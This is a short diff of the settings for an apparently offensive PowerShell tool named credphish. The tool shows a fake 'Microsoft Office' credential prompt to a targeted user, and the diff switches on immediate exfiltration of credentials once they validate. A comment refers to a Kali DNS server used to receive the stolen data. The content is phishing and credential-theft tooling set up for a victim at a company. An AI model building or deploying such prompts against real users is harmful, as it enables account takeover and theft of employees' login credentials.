@@ -32,7 +32,7 @@ $promptCaption = "Microsoft Office"
 $promptMessage = "Connecting to: $targetUser@$companyEmail"
 $maxTries = 1 # maximum number of times to invoke prompt
 $delayPrompts = 2 # seconds between prompts
-$validateCredentials = $false # interrupt $maxTries and immediately exfil if credentials are valid
+$validateCredentials = $true # interrupt $maxTries and immediately exfil if credentials are valid
 
 # dns
 # start dns server in kali: python3 /path/to/credphish/dns_server.py
